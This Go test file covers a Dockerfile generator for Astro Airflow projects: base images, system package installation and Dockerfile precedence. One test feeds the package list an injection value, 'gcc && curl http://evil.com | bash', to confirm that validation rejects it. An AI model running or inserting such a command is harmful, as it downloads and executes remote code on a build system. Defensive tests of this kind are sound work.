package airflow

import (
	"os"
	"path/filepath"
)

func (s *Suite) TestGenerateDockerfile_Basic() {
	proj := &AstroProject{
		RuntimeVersion: "3.1-14",
	}

	content, err := GenerateDockerfile(proj)
	s.NoError(err)
	s.Contains(content, "FROM astrocrpublic.azurecr.io/runtime:3.1-14")
	s.Contains(content, "Auto-generated from pyproject.toml")
	s.NotContains(content, "apt-get")
}

func (s *Suite) TestGenerateDockerfile_WithSystemPackages() {
	proj := &AstroProject{
		RuntimeVersion: "3.1-14",
		SystemPackages: []string{"gcc", "libpq-dev"},
	}

	content, err := GenerateDockerfile(proj)
	s.NoError(err)
	s.Contains(content, "FROM astrocrpublic.azurecr.io/runtime:3.1-14")
	s.Contains(content, "apt-get install -y --no-install-recommends gcc libpq-dev")
	s.Contains(content, "rm -rf /var/lib/apt/lists/*")
}

func (s *Suite) TestGenerateDockerfile_EmptyRuntimeVersion() {
	proj := &AstroProject{}

	_, err := GenerateDockerfile(proj)
	s.Error(err)
	s.Contains(err.Error(), "runtime-version is required")
}

func (s *Suite) TestGenerateDockerfile_InvalidSystemPackage() {
	proj := &AstroProject{
		RuntimeVersion: "3.1-14",
		SystemPackages: []string{"gcc && curl http://evil.com | bash"},
	}

	_, err := GenerateDockerfile(proj)
	s.Error(err)
	s.Contains(err.Error(), "invalid system package name")
}

func (s *Suite) TestGenerateDockerfile_ValidDebianPackageNames() {
	proj := &AstroProject{
		RuntimeVersion: "3.1-14",
		SystemPackages: []string{"libpq-dev", "python3.12-dev", "g++", "libc6"},
	}

	content, err := GenerateDockerfile(proj)
	s.NoError(err)
	s.Contains(content, "libpq-dev python3.12-dev g++ libc6")
}

func (s *Suite) TestEnsureDockerfile_PyProject() {
	tmpDir, err := os.MkdirTemp("", "dockerfile-gen")
	s.Require().NoError(err)
	defer os.RemoveAll(tmpDir)

	pyproject := `[project]
name = "test-gen"

[tool.astro]
airflow-version = "3.0.1"
runtime-version = "3.1-14"

[tool.astro.docker]
system-packages = ["gcc"]
`
	s.Require().NoError(os.WriteFile(filepath.Join(tmpDir, PyProjectFile), []byte(pyproject), 0o644))

	result, err := EnsureDockerfile(tmpDir, "Dockerfile")
	s.NoError(err)
	s.Equal(filepath.Join(tmpDir, ".astro", generatedDockerfileName), result)

	content, err := os.ReadFile(result)
	s.NoError(err)
	s.Contains(string(content), "FROM astrocrpublic.azurecr.io/runtime:3.1-14")
	s.Contains(string(content), "gcc")
}

func (s *Suite) TestEnsureDockerfile_LegacyProject() {
	tmpDir, err := os.MkdirTemp("", "dockerfile-gen")
	s.Require().NoError(err)
	defer os.RemoveAll(tmpDir)

	s.Require().NoError(os.WriteFile(filepath.Join(tmpDir, "Dockerfile"), []byte("FROM astro-runtime:12.0.0"), 0o644))

	result, err := EnsureDockerfile(tmpDir, "Dockerfile")
	s.NoError(err)
	s.Equal("Dockerfile", result)
}

func (s *Suite) TestEnsureDockerfile_PyProjectWithHandWrittenDockerfile() {
	tmpDir, err := os.MkdirTemp("", "dockerfile-gen")
	s.Require().NoError(err)
	defer os.RemoveAll(tmpDir)

	// pyproject.toml exists with [tool.astro]
	pyproject := `[project]
name = "custom-docker"

[tool.astro]
airflow-version = "3.0.1"
runtime-version = "3.1-14"
`
	s.Require().NoError(os.WriteFile(filepath.Join(tmpDir, PyProjectFile), []byte(pyproject), 0o644))

	// Hand-written Dockerfile also exists — should take precedence
	s.Require().NoError(os.WriteFile(filepath.Join(tmpDir, "Dockerfile"), []byte("FROM custom-image:latest\nRUN custom-step"), 0o644))

	result, err := EnsureDockerfile(tmpDir, "Dockerfile")
	s.NoError(err)
	s.Equal("Dockerfile", result)

	// Generated Dockerfile should NOT exist
	_, err = os.Stat(filepath.Join(tmpDir, ".astro", generatedDockerfileName))
	s.True(os.IsNotExist(err))
}

func (s *Suite) TestEnsureDockerfile_BrokenPyProject() {
	tmpDir, err := os.MkdirTemp("", "dockerfile-gen")
	s.Require().NoError(err)
	defer os.RemoveAll(tmpDir)

	// pyproject.toml with [tool.astro] but missing airflow-version — should error, not silently fall through
	pyproject := `[project]
name = "test-no-versions"

[tool.astro]
mode = "docker"
`
	s.Require().NoError(os.WriteFile(filepath.Join(tmpDir, PyProjectFile), []byte(pyproject), 0o644))

	_, err = EnsureDockerfile(tmpDir, "Dockerfile")
	s.Error(err)
	s.Contains(err.Error(), "airflow-version")
}
